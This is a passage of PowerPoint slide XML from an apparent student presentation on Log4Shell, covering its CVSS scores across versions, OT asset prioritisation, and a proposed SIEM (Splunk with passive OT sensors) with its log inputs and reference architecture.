                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>…/MAV:A/MAC:H</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Shape 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="5029200"/>
            <a:ext cx="11094415" cy="1051560"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7826"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="3A2320"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Text 19"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="5184648"/>
            <a:ext cx="10881360" cy="777240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1450" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EEF3FA"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>The lesson:  </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1450" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EEF3FA"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>in OT you cannot deprioritise the way you would an IT box — segmentation lowers exploitability, but High integrity/availability requirements keep every asset at least High.</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1C5CAB"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>PUTTING IT TOGETHER</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2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1B2430"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>One flaw, every version and metric group</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Image 0" descr="/home/user/kismat/comp2004-log4shell/src/figures/fig2_cvss_scores.png">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:srcRect l="0" r="0" t="-9385" b="-9385"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1965960"/>
            <a:ext cx="7406640" cy="3931920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8229600" y="2148840"/>
            <a:ext cx="3383280" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1B2430"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>v2.0 → 9.3</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8229600" y="2514600"/>
            <a:ext cx="3383280" cy="731520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="47515F"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>No Scope metric, so it can't reward the break-out — lands below 10.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8229600" y="3200400"/>
            <a:ext cx="3383280" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1B2430"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>v3.1 → 10.0</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8229600" y="3566160"/>
            <a:ext cx="3383280" cy="731520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="47515F"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Adds Scope; the version I based my analysis on.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8229600" y="4251960"/>
            <a:ext cx="3383280" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1B2430"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>v4.0 → 10.0</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8229600" y="4617720"/>
            <a:ext cx="3383280" cy="731520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="47515F"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Splits impact into vulnerable vs. subsequent systems — still max.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8229600" y="5394960"/>
            <a:ext cx="3410712" cy="777240"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 10588"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="EAF2FC"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8412480" y="5532120"/>
            <a:ext cx="3108960" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0"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Always cite the version</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1B2430"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> — the same flaw reads 9.3 or 10.0.</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01826"/>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7FA8E6"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>TASK 2</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3400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Why a SIEM — and which one for us</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1828800"/>
            <a:ext cx="11094415" cy="1371600"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="16233A"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="2011680"/>
            <a:ext cx="10881360" cy="1005840"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EEF3FA"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>No single log proves Log4Shell. A web log shows the payload; a firewall log shows the odd LDAP callout; an OT sensor shows the gateway acting strangely. </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EEF3FA"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>The SIEM is the one place those line up — on one asset, within seconds.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="3474720"/>
            <a:ext cx="5349240" cy="2194560"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3750"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="16233A"/>
          </a:solidFill>
          <a:ln w="17780">
            <a:solidFill>
              <a:srgbClr val="2E6FD6"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="868680" y="3749040"/>
            <a:ext cx="4754880" cy="640080"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7FA8E6"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Proposed: Splunk Enterprise Security</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="868680" y="4434840"/>
            <a:ext cx="4754880" cy="1097280"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B9C4D4"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Risk-based alerting, published Log4Shell detections, ATT&amp;CK mapping, OT add-on. Reproducible free in the demo with Wazuh / Elastic.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6172200" y="3474720"/>
            <a:ext cx="5349240" cy="2194560"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3750"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="16233A"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="34405A"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6492240" y="3749040"/>
            <a:ext cx="4754880" cy="640080"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7FA8E6"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Paired with an OT sensor</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6492240" y="4434840"/>
            <a:ext cx="4754880" cy="1097280"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B9C4D4"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Passive monitoring (e.g. Nozomi / Claroty) feeds the SIEM, because EDR agents can't be installed on controllers or the Connect gateways.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1C5CAB"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>REFERENCE ARCHITECTURE</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2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1B2430"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>From IT and OT log sources to SOC action</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Image 0" descr="/home/user/kismat/comp2004-log4shell/src/figures/fig3_siem_architecture.png">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:srcRect l="-17598" r="-17598" t="0" b="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1828800"/>
            <a:ext cx="11094415" cy="3840480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="6035040"/>
            <a:ext cx="10972800" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="6E7A8C"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>The next three slides drill into the pipeline: its </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1B2430"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>inputs</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="6E7A8C"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>, its </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1B2430"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>insights</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="6E7A8C"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>, and its </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1B2430"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>actions</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="6E7A8C"/>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B"/>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1C5CAB"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>1 · SIEM INPUTS</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2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1B2430"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>What must we ingest — and why</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4572000"/>
                <a:gridCol w="6519672"/>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Data input</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="140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10182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it is critical for this incident</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="140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101826"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="0">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1B2430"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>Web / app &amp; WAF logs (SIMATIC, Java apps)</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="140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47515F"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
